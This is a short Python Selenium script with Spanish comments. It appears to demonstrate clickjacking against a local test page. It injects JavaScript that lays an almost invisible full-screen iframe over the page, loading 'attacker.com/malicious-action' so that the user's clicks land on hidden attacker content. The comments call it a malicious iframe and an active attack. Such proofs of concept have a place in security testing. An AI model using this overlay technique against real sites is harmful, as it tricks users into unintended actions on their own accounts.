from selenium import webdriver
from selenium.webdriver.common.by import By
import time

# Configuración
driver = webdriver.Chrome()
target_url = "http://localhost:3000/vulnerable-page"

try:
    driver.get(target_url)
    time.sleep(2)
    
    # Crear iframe transparente superpuesto
    malicious_js = """
    var iframe = document.createElement('iframe');
    iframe.style.position = 'absolute';
    iframe.style.top = '0';
    iframe.style.left = '0';
    iframe.style.width = '100%';
    iframe.style.height = '100%';
    iframe.style.opacity = '0.01';
    iframe.style.zIndex = '1000';
    iframe.src = 'http://attacker.com/malicious-action';
    document.body.appendChild(iframe);
    """
    
    driver.execute_script(malicious_js)
    print("Iframe malicioso inyectado")
    time.sleep(5)  # Mantener el ataque activo
    
finally:
    driver.quit()